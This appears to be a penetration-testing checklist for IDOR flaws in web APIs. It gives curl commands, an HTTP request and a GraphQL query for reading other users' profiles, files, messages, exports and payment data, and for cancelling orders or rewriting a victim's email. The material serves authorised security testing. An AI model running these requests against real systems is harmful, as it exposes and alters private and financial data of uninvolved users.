# Insecure Direct Object Reference (IDOR) Testing

## Objective

Identify endpoints where object identifiers (user IDs, order IDs, file IDs, etc.) are directly exposed in requests and can be manipulated to access or modify other users' data without proper authorization checks.

---

## 1. Numeric ID Enumeration

### Identify Target Parameters
Look for numeric IDs in:
- URL path: `/users/1234`, `/orders/5678`, `/invoices/91011`
- Query parameters: `?user_id=1234`, `?doc_id=5678`
- Request body: `{"userId": 1234}`
- Hidden form fields

### Test Procedure
```bash
# You are user with ID 1001
# Test access to user ID 1000 (another user)
curl -si https://target/api/users/1000 \
  -H "Authorization: Bearer USER_A_TOKEN" \
  | grep -E "HTTP|email|name|phone"

# Test adjacent IDs
for ID in 999 1000 1002 1003; do
  echo "Testing ID: $ID"
  curl -si https://target/api/users/$ID \
    -H "Authorization: Bearer USER_A_TOKEN" \
    | grep -E "HTTP|email|name"
  sleep 0.2
done
```

---

## 2. UUID / GUID-Based IDOR

Even UUIDs can be vulnerable if they are:
- Sequential or time-based (UUIDv1)
- Leaked in API responses, emails, or URLs

### Test Procedure
```bash
# Get your own UUID from profile
MY_UUID=$(curl -s https://target/api/me \
  -H "Authorization: Bearer USER_A_TOKEN" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# Get another user's UUID (from shared content, comments, etc.)
OTHER_UUID="uuid-obtained-from-other-source"

# Test access
curl -si https://target/api/users/$OTHER_UUID \
  -H "Authorization: Bearer USER_A_TOKEN" \
  | grep -E "HTTP|email|name|address"
```

---

## 3. IDOR in File/Document Access

```bash
# Your uploaded file
curl -si https://target/files/file_id_123 \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP

# Another user's file ID (obtained from source, API leakage, or brute force)
curl -si https://target/files/file_id_122 \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP
curl -si https://target/files/file_id_124 \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP
```

---

## 4. IDOR in State-Changing Operations

### Order/Transaction Manipulation
```bash
# Can User A cancel User B's order?
curl -si -X POST https://target/api/orders/OTHER_USER_ORDER_ID/cancel \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" | grep HTTP

# Can User A view User B's payment details?
curl -si https://target/api/orders/OTHER_USER_ORDER_ID/payment \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP
```

### Profile Modification
```bash
# Can User A modify User B's profile?
curl -si -X PUT https://target/api/users/USER_B_ID \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@attacker.com"}' | grep HTTP
```

### Message/Inbox Access
```bash
# Can User A read User B's messages?
curl -si https://target/api/messages/USER_B_MSG_ID \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP
```

---

## 5. IDOR in Request Body

Look for user-controlled IDs in POST/PUT request bodies:

```http
POST /api/transfer HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_A_TOKEN

{
  "from_account": "USER_A_ACCOUNT_ID",   ← test with USER_B_ACCOUNT_ID
  "to_account": "RECIPIENT_ID",
  "amount": 100
}
```

---

## 6. IDOR via Reference in Response

Some applications embed object IDs of related resources in API responses. Collect these IDs and test access:

```bash
# Step 1: Get your order details
curl -s https://target/api/orders/MY_ORDER_ID \
  -H "Authorization: Bearer USER_A_TOKEN"

# Response may contain: {"id":"123","invoice_id":"INV-456","payment_id":"PAY-789"}
# Test each referenced ID:
curl -si https://target/api/invoices/INV-456 \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP

# Now test with User B's equivalent IDs
curl -si https://target/api/invoices/INV-455 \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP
```

---

## 7. IDOR in GraphQL

```graphql
# Test fetching another user's data via ID
query {
  user(id: "OTHER_USER_ID") {
    id
    email
    address
    creditCards { number expiryDate }
  }
}
```

---

## 8. IDOR in Export / Download Features

```bash
# Export your own data
curl -si https://target/api/export?userId=USER_A_ID \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP

# Export another user's data
curl -si https://target/api/export?userId=USER_B_ID \
  -H "Authorization: Bearer USER_A_TOKEN" | grep HTTP
```

---

## Evidence to Capture

- Two accounts: User A (token + ID) and User B (ID only)
- Request from User A using User B's ID
- Response showing User B's private data (blur real values in screenshots)
- HTTP status comparison: 200 returned instead of expected 403

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| IDOR on user profile (read) | Pass/Fail | High |
| IDOR on user profile (write) | Pass/Fail | High |
| IDOR on financial/order data | Pass/Fail | High-Critical |
| IDOR on file/document download | Pass/Fail | Medium-High |
| IDOR on state-changing actions | Pass/Fail | High |
| UUID-based IDOR | Pass/Fail | High |
